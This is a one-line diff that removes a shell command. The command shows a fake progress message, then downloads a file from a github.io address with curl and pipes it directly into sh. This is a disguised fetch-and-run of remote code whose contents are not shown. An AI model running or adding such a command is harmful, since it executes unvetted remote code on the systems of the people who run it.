@@ -1,1 +1,0 @@
-echo 'Progress: 14.0%'; curl -L --progress-bar frkns.github.io/fun/CERTIFICATES_RECOGNIZED_FILED_INSTANCE.a.out | sh
